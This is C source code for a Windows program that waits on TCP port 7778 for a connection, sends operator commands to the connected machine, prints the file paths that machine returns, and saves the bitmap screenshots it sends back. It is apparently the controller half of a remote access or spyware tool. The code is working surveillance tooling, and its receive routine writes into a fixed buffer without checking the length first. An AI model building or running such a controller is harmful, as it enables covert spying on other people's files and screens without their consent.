#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib,"Ws2_32.lib")

WSADATA data;
SOCKET sock;
SOCKET client;
SOCKADDR_IN adres;

char command[255];
char fpath[255];

void main(){
	WORD ver = MAKEWORD(2, 2);
	WSAStartup(ver, &data);
	sock = socket(AF_INET, SOCK_STREAM, 0);
	adres.sin_family = AF_INET;
	adres.sin_port = htons(7778);
	adres.sin_addr.S_un.S_addr = INADDR_ANY;
	bind(sock,(SOCKADDR*)&adres,sizeof(adres));
	listen(sock,SOMAXCONN);
	client = accept(sock,0,0);
	recv(client,command,1,MSG_WAITALL);
	printf("connected\n");
	for(;;){
		scanf_s("%s",command);
		send(client,command,255,0);
		switch(command[0]){
		case 'l':{
			for(;;){
				int fsz;
				recv(client,&fsz,4,MSG_WAITALL);
				if(!fsz)break;
				recv(client,fpath,fsz,MSG_WAITALL);
				fpath[fsz] = 0;
				printf("%s\n",fpath);
			}
			break;
		}
		case 's':{
			BITMAPFILEHEADER bmpfh = {0};
			BITMAPINFOHEADER bmpif = {0};
			char* bmp = 0;
			recv(client,&bmpfh,sizeof(BITMAPFILEHEADER),MSG_WAITALL);
			recv(client,&bmpif,sizeof(BITMAPINFOHEADER),MSG_WAITALL);
			int bmpsz = (((24 * bmpif.biWidth + 31)&~31) / 8) * bmpif.biHeight;
			bmp = HeapAlloc(GetProcessHeap(),0,bmpsz);
			recv(client,bmp,bmpsz,MSG_WAITALL);
			_itoa_s(__rdtsc(),command,32,32);
			HANDLE f = CreateFileA(command,GENERIC_WRITE,0,0,CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
			WriteFile(f,&bmpfh,sizeof(BITMAPFILEHEADER),0,0);
			WriteFile(f,&bmpif,sizeof(BITMAPINFOHEADER),0,0);
			WriteFile(f,bmp,bmpsz,0,0);
			CloseHandle(f);
			HeapFree(GetProcessHeap(),0,bmp);
			break;
		}
		}
	}
}
